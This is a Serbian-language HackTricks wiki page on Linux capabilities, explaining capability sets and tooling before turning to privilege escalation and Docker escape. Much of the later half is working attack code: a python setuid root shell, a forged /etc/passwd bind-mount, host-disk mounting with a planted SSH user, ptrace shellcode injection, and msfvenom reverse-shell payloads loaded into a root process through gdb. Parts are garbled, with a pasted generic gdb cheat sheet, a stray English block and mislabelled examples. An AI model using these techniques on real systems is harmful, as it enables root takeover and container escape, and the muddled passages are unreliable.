# Linux Capabilities

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) je najrelevantniji sajber bezbednosni događaj u **Španiji** i jedan od najvažnijih u **Evropi**. Sa **misijom promovisanja tehničkog znanja**, ovaj kongres je ključno mesto susreta tehnoloških i sajber bezbednosnih profesionalaca u svakoj disciplini.\\

{% embed url="https://www.rootedcon.com/" %}

## Linux sposobnosti

Linux sposobnosti dele **root privilegije na manje, različite jedinice**, omogućavajući procesima da imaju podskup privilegija. Ovo smanjuje rizike tako što ne dodeljuje potpune root privilegije nepotrebno.

### Problem:

* Normalni korisnici imaju ograničena ovlašćenja, što utiče na zadatke poput otvaranja mrežnog priključka koji zahteva root pristup.

### Skupovi sposobnosti:

1. **Nasleđene (CapInh)**:

* **Svrha**: Određuje sposobnosti koje se prenose od roditeljskog procesa.
* **Funkcionalnost**: Kada se kreira novi proces, on nasleđuje sposobnosti od svog roditelja u ovom skupu. Korisno za održavanje određenih privilegija tokom stvaranja procesa.
* **Ograničenja**: Proces ne može dobiti sposobnosti koje njegov roditelj nije posedovao.

2. **Efektivne (CapEff)**:

* **Svrha**: Predstavlja stvarne sposobnosti koje proces trenutno koristi.
* **Funkcionalnost**: To je skup sposobnosti koje je jezgro provere kernela za dodelu dozvole za različite operacije. Za datoteke, ovaj skup može biti oznaka koja ukazuje da li se dozvoljene sposobnosti datoteke smatraju efektivnim.
* **Značaj**: Efektivni skup je ključan za trenutne provere privilegija, delujući kao aktivni skup sposobnosti koje proces može koristiti.

3. **Dozvoljene (CapPrm)**:

* **Svrha**: Definiše maksimalni skup sposobnosti koje proces može posedovati.
* **Funkcionalnost**: Proces može povećati sposobnost iz dozvoljenog skupa u svoj efektivni skup, dajući mu mogućnost korišćenja te sposobnosti. Takođe može odbaciti sposobnosti iz svog dozvoljenog skupa.
* **Granica**: Deluje kao gornja granica sposobnosti koje proces može imati, obezbeđujući da proces ne premaši svoj unapred definisani opseg privilegija.

4. **Ograničene (CapBnd)**:

* **Svrha**: Stavlja ograničenje na sposobnosti koje proces može steći tokom svog životnog ciklusa.
* **Funkcionalnost**: Čak i ako proces ima određenu sposobnost u svom nasleđenom ili dozvoljenom skupu, ne može steći tu sposobnost osim ako se takođe nalazi u ograničenom skupu.
* **Upotreba**: Ovaj skup je posebno koristan za ograničavanje potencijala eskalacije privilegija procesa, dodajući dodatni sloj sigurnosti.

5. **Ambijentalne (CapAmb)**:

* **Svrha**: Omogućava održavanje određenih sposobnosti tokom `execve` sistemskog poziva, koji obično rezultira potpunim resetovanjem sposobnosti procesa.
* **Funkcionalnost**: Osigurava da programi koji nisu SUID i nemaju povezane sposobnosti datoteka zadrže određene privilegije.
* **Ograničenja**: Sposobnosti u ovom skupu su podložne ograničenjima nasleđenog i dozvoljenog skupa, obezbeđujući da ne premašuju dozvoljene privilegije procesa.

```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```

Za dodatne informacije pogledajte:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## Mogućnosti procesa i binarnih fajlova

### Mogućnosti procesa

Da biste videli mogućnosti za određeni proces, koristite datoteku **status** u direktorijumu /proc. Kako pruža više detalja, ograničićemo se samo na informacije koje se odnose na Linux mogućnosti.\
Imajte na umu da se informacije o mogućnostima održavaju po niti za sve pokrenute procese, a za binarne fajlove u fajl sistemu čuvaju se u proširenim atributima.

Mogućnosti možete pronaći definisane u /usr/include/linux/capability.h

Mogućnosti trenutnog procesa možete pronaći u `cat /proc/self/status` ili izvršavanjem `capsh --print`, a mogućnosti drugih korisnika u `/proc/<pid>/status`

```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```

Ova komanda bi trebala vratiti 5 linija na većini sistema.

* CapInh = Nasleđene sposobnosti
* CapPrm = Dozvoljene sposobnosti
* CapEff = Efektivne sposobnosti
* CapBnd = Skup granica
* CapAmb = Skup ambijentalnih sposobnosti

```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

Ovi heksadecimalni brojevi nemaju smisla. Koristeći alat capsh, možemo ih dekodirati u nazive mogućnosti.

```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```

Sada ćemo proveriti **mogućnosti** koje koristi `ping`:

```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Iako to funkcioniše, postoji još jedan i jednostavniji način. Da biste videli sposobnosti pokrenutog procesa, jednostavno koristite alatku **getpcaps** praćenu njenim identifikatorom procesa (PID). Takođe možete pružiti listu identifikatora procesa.

```bash
getpcaps 1234
```

Hajde da proverimo ovde sposobnosti `tcpdump`-a nakon što smo dali binarnom fajlu dovoljno sposobnosti (`cap_net_admin` i `cap_net_raw`) da presretne mrežu (_tcpdump se izvršava u procesu 9562_):

```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Kao što možete videti, dodeljene sposobnosti odgovaraju rezultatima 2 načina dobijanja sposobnosti binarnog fajla.\
Alat _getpcaps_ koristi sistemski poziv **capget()** da bi dobio informacije o dostupnim sposobnostima za određenu nit. Ovaj sistemski poziv samo zahteva PID da bi dobio više informacija.

### Sposobnosti Binarnih Fajlova

Binarni fajlovi mogu imati sposobnosti koje se mogu koristiti tokom izvršavanja. Na primer, vrlo je često pronaći binarni fajl `ping` sa sposobnošću `cap_net_raw`:

```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```

Možete **pretraživati binarne datoteke sa sposobnostima** koristeći:

```bash
getcap -r / 2>/dev/null
```

### Smanjivanje privilegija pomoću capsh

Ako smanjimo privilegije CAP\_NET\_RAW za _ping_, tada ping alatka više neće raditi.

```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```

Osim izlaza _capsh_ samog, i sam _tcpdump_ komanda treba da izazove grešku.

> /bin/bash: /usr/sbin/tcpdump: Operacija nije dozvoljena

Greška jasno pokazuje da ping komanda nije dozvoljena da otvori ICMP socket. Sada znamo sigurno da ovo radi kako se očekuje.

### Uklanjanje sposobnosti

Možete ukloniti sposobnosti binarnog fajla sa

```bash
setcap -r </path/to/binary>
```

## Korisničke sposobnosti

Izgleda da je **moguće dodeliti sposobnosti i korisnicima**. Ovo verovatno znači da će svaki proces koji izvršava korisnik moći da koristi korisničke sposobnosti.\
Na osnovu [ovoga](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [ovoga](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) i [ovoga](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user), nekoliko datoteka treba konfigurisati kako bi se korisniku dodelile određene sposobnosti, ali datoteka koja dodeljuje sposobnosti svakom korisniku će biti `/etc/security/capability.conf`.\
Primer datoteke:

```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```

## Okruženje sposobnosti

Kompajliranjem sledećeg programa moguće je **pokrenuti bash shell unutar okruženja koje pruža sposobnosti**.

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```

Unutar **bash-a koji se izvršava pomoću kompajliranog ambijentalnog binarnog fajla**, moguće je primetiti **nove sposobnosti** (običan korisnik neće imati nikakve sposobnosti u "trenutnom" odeljku).

```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```

{% hint style="danger" %}
Možete **dodati samo sposobnosti koje su prisutne** u dozvoljenom i nasleđenom skupu.
{% endhint %}

### Binarni fajlovi koji su svesni sposobnosti / Binarni fajlovi koji nisu svesni sposobnosti

**Binarni fajlovi koji su svesni sposobnosti neće koristiti nove sposobnosti** koje su dodeljene od strane okruženja, dok će **binarni fajlovi koji nisu svesni sposobnosti ih koristiti** jer ih neće odbiti. Ovo čini binarne fajlove koji nisu svesni sposobnosti ranjivim unutar posebnog okruženja koje dodeljuje sposobnosti binarnim fajlovima.

## Sposobnosti servisa

Podrazumevano, **servis koji se pokreće kao root će imati dodeljene sve sposobnosti**, a u nekim slučajevima to može biti opasno.\
Stoga, **konfiguracioni fajl servisa** omogućava da se **specificira** koje **sposobnosti** želite da ima, **i** koji **korisnik** treba da izvrši servis kako bi se izbeglo pokretanje servisa sa nepotrebnim privilegijama:

```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```

## Mogućnosti u Docker kontejnerima

Po defaultu, Docker dodeljuje nekoliko mogućnosti kontejnerima. Veoma je jednostavno proveriti koje su to mogućnosti pokretanjem:

```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) je najrelevantniji događaj u oblasti kibernetičke bezbednosti u **Španiji** i jedan od najvažnijih u **Evropi**. Sa **misijom promovisanja tehničkog znanja**, ovaj kongres je vrelo mesto susreta tehnoloških i kibernetičkih stručnjaka u svakoj disciplini.

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Container Escape

Mogućnosti su korisne kada **želite da ograničite sopstvene procese nakon izvođenja privilegovanih operacija** (npr. nakon postavljanja chroot-a i vezivanja za socket). Međutim, mogu biti iskorišćene tako što se proslede zlonamerne komande ili argumenti koji se zatim izvršavaju kao root.

Možete nametnuti mogućnosti programima koristeći `setcap`, a ove mogućnosti možete proveriti koristeći `getcap`:

```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

`+ep` znači da dodajete sposobnost ("-" bi je uklonilo) kao Efektivnu i Dozvoljenu.

Da biste identifikovali programe u sistemu ili folderu sa sposobnostima:

```bash
getcap -r / 2>/dev/null
```

### Primer eksploatacije

U sledećem primeru je otkrivena ranjivost binarnog fajla `/usr/bin/python2.6` koja omogućava eskalaciju privilegija:

```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

**Mogućnosti** potrebne `tcpdump`-u da **omoguće svakom korisniku da presreće pakete**:

````markdown
To allow any user to sniff packets, the `tcpdump` binary needs the following **capabilities**:

1. `CAP_NET_RAW`: This capability allows the binary to create raw network sockets, which is necessary for packet sniffing.

To grant these capabilities to the `tcpdump` binary, you can use the `setcap` command:

```bash
sudo setcap cap_net_raw=eip /usr/sbin/tcpdump
````

After granting the necessary capabilities, any user will be able to run `tcpdump` and sniff packets without requiring root privileges.

````
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
````

### Poseban slučaj "praznih" sposobnosti

[Iz dokumentacije](https://man7.org/linux/man-pages/man7/capabilities.7.html): Napomena da je moguće dodeliti prazne skupove sposobnosti programskom fajlu, što omogućava kreiranje programa sa postavljenim korisničkim ID-om korena koji menja efektivni i sačuvani korisnički ID procesa koji izvršava program na 0, ali ne dodeljuje nikakve sposobnosti tom procesu. Drugim rečima, ako imate binarni fajl koji:

1. nije vlasništvo korisnika root
2. nema postavljene `SUID`/`SGID` bitove
3. ima prazan skup sposobnosti (npr. `getcap myelf` vraća `myelf =ep`)

taj binarni fajl će se izvršavati kao root.

## CAP\_SYS\_ADMIN

[**`CAP_SYS_ADMIN`**](https://man7.org/linux/man-pages/man7/capabilities.7.html) je izuzetno moćna Linux sposobnost, često izjednačavana sa nivoom korisnika root zbog svojih obimnih **administrativnih privilegija**, kao što su montiranje uređaja ili manipulacija kernel funkcijama. Iako je neophodna za kontejnere koji simuliraju celokupne sisteme, **`CAP_SYS_ADMIN` predstavlja značajne bezbednosne izazove**, posebno u kontejnerizovanim okruženjima, zbog potencijala za eskalaciju privilegija i kompromitovanje sistema. Stoga, njegova upotreba zahteva stroge bezbednosne procene i oprezno upravljanje, sa snažnim naglaskom na odbacivanje ove sposobnosti u kontejnerima specifičnim za aplikaciju, kako bi se poštovao **princip najmanjih privilegija** i smanjila površina napada.

**Primer sa binarnim fajlom**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```

Korišćenjem pythona možete montirati modifikovanu _passwd_ datoteku preko prave _passwd_ datoteke:

```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```

I na kraju **montirajte** izmenjeni `passwd` fajl na `/etc/passwd`:

```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```

I moći ćete **`su` kao root** koristeći lozinku "password".

**Primer sa okruženjem (Docker izlazak iz okvira)**

Možete proveriti omogućene sposobnosti unutar Docker kontejnera koristeći:

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Unutar prethodnog izlaza možete videti da je omogućena SYS\_ADMIN sposobnost.

* **Montiranje**

Ovo omogućava docker kontejneru da **montira host disk i slobodno mu pristupa**:

```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```

* **Puna pristupa**

U prethodnoj metodi smo uspeli da pristupimo disku domaćina Docker-a.\
U slučaju da primetite da domaćin pokreće **ssh** server, možete **kreirati korisnika unutar diska domaćina Docker-a** i pristupiti mu putem SSH-a:

```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```

## CAP\_SYS\_PTRACE

**Ovo znači da možete izbeći kontejner ubacivanjem shell koda unutar nekog procesa koji se izvršava unutar hosta.** Da biste pristupili procesima koji se izvršavaju unutar hosta, kontejner mora biti pokrenut barem sa **`--pid=host`**.

[**`CAP_SYS_PTRACE`**](https://man7.org/linux/man-pages/man7/capabilities.7.html) omogućava korišćenje funkcionalnosti za debagovanje i praćenje sistemskih poziva koje pruža `ptrace(2)` i pozive za povezivanje preko memorije kao što su `process_vm_readv(2)` i `process_vm_writev(2)`. Iako je moćan u dijagnostičke i nadzorne svrhe, ako je `CAP_SYS_PTRACE` omogućen bez restriktivnih mera kao što je seccomp filter na `ptrace(2)`, može značajno narušiti sigurnost sistema. Konkretno, može se iskoristiti za zaobilaženje drugih sigurnosnih ograničenja, posebno onih nametnutih od strane seccomp-a, kao što je prikazano u [dokazima koncepta (PoC) kao što je ovaj](https://gist.github.com/thejh/8346f47e359adecd1d53).

**Primer sa binarnim fajlom (python)**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

**Primer sa binarnim fajlom (gdb)**

`gdb` sa mogućnošću `ptrace`:

```
/usr/bin/gdb = cap_sys_ptrace+ep
```

Kreirajte shellcode pomoću msfvenom alata za ubrizgavanje u memoriju putem gdb-a

```bash
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f c -b "\x00" -o shellcode.c
```

Ovaj naredbeni redak koristi msfvenom alat za generiranje shellcode-a za Linux x86 arhitekturu. Shellcode će uspostaviti obrnutu TCP vezu s vašim IP adresom i odredišnim portom. Zamijenite `<your_ip>` s vašom IP adresom i `<your_port>` s odredišnim portom.

Opcija `-f c` generira shellcode u formatu C koda, dok opcija `-b "\x00"` izbjegava generiranje bajtova s vrijednošću 0, što može uzrokovati probleme prilikom ubrizgavanja u memoriju.

Rezultirajući shellcode bit će spremljen u datoteku `shellcode.c`.

```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```

Debugirajte root proces sa gdb-om i kopirajte prethodno generisane gdb linije:

```bash
sudo gdb -p <PID>
```

```bash
(gdb) set follow-fork-mode child
(gdb) set detach-on-fork off
(gdb) catch exec
(gdb) run
```

```bash
(gdb) info inferiors
(gdb) inferior <N>
(gdb) info threads
(gdb) thread <N>
```

```bash
(gdb) break <function>
(gdb) continue
(gdb) next
(gdb) step
(gdb) finish
```

```bash
(gdb) print <variable>
(gdb) set variable <variable> = <value>
(gdb) display <variable>
(gdb) undisplay <N>
```

```bash
(gdb) backtrace
(gdb) frame <N>
(gdb) up
(gdb) down
```

```bash
(gdb) info breakpoints
(gdb) delete <N>
(gdb) disable <N>
(gdb) enable <N>
```

```bash
(gdb) quit
```

```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
